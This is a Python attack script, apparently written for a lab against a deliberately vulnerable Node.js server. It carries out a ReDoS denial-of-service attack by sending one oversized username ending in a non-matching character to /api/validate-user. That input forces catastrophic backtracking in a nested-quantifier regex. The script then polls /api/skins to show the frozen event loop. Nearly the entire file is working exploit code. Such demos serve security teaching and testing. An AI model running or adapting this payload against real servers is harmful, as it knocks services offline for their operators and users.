#!/usr/bin/env python3
"""DoS Layer 1 - ReDoS / algorithmic DoS (fast demo mode).

One request to POST /api/validate-user freezes the whole Node.js event
loop. The server's regex  ^([a-zA-Z0-9]+)+$  has nested unguarded
quantifiers (catastrophic backtracking): a long alphabetic string with a
non-matching trailing char forces exponential backtracking, pegging the
CPU and blocking every other request.

This version does NOT wait for the poison request to return - it fires it
in a background thread and probes a healthy endpoint every second, so the
"server frozen" proof prints within a few seconds.

Usage:
    python3 redos.py [base_url] [payload_size]
    python3 redos.py http://192.168.56.1:3000 40000
"""
import sys
import threading
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.56.1:3000"
SIZE = int(sys.argv[2]) if len(sys.argv) > 2 else 40000
POISON_SIZE_LIMIT = 95000  # stay under body-parser's 100kb default cap

if SIZE > POISON_SIZE_LIMIT:
    print("[!] payload too large: keep it under 95000 chars "
          "(body-parser rejects larger bodies with 413)")
    sys.exit(2)


def quick_probe():
    t0 = time.time()
    try:
        r = requests.get(BASE + "/api/skins", timeout=3)
        return "HTTP %d (%ss)" % (r.status_code, round(time.time() - t0, 2))
    except requests.exceptions.RequestException:
        return "TIMEOUT / UNREACHABLE"


print("== ReDoS: single request against /api/validate-user ==")
print("[baseline] /api/skins ->", quick_probe())


def fire_poison():
    try:
        requests.post(BASE + "/api/validate-user",
                      json={"username": "a" * SIZE + "!"}, timeout=600)
    except Exception:
        pass  # the request never returns on purpose


t = threading.Thread(target=fire_poison, daemon=True)
t.start()

print("[sent] %d+1 chars in background -> probe /api/skins every 1s..." % SIZE)
for i in range(1, 16):
    time.sleep(1)
    got = quick_probe()
    print("  t+%2ds  /api/skins -> %s" % (i, got))
    if "TIMEOUT" in got:
        print()
        print(">> SERVER FROZEN (event loop busy, all endpoints blocked).")
        print(">> Evidence: keep this terminal + screenshot the host Task Manager")
        print(">> (node.exe ~100% CPU). Restart the vulnerable server afterwards:")
        print(">>  Ctrl+C its terminal, then `node server.js`.")
        break
else:
    print()
    print("[!] no freeze detected in 15s - try a bigger payload size.")
print("== done ==")